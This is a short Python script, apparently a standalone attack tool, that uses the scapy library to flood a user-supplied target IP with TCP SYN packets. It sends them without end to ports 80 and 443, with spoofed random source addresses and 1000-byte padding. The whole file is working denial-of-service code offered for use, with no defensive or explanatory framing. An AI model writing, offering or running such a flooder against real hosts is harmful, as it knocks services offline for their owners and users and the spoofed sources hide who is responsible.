#!/usr/bin/env python3
from argparse import ArgumentParser
from scapy.all import IP, TCP, Raw, RandShort, RandIP, send
import random


PACKET_SIZE = 1000
ports = [80, 443]


def parse_arguments():
    parser = ArgumentParser(description="Floods target IP with SYN packets")
    parser.add_argument("-t", "--target", dest="target", type=str, required=True)

    return parser.parse_args()


def main():
    args = parse_arguments()

    print(f"Sending SYN packets to {args.target}...")
    print(f"Press CTRL + C to stop")
    while True:
        send(IP(src=RandIP(), dst=args.target)/TCP(sport=RandShort(),
        dport=ports, flags="S")/Raw(b"X" * PACKET_SIZE), verbose=1)

if __name__ == '__main__':
    main()

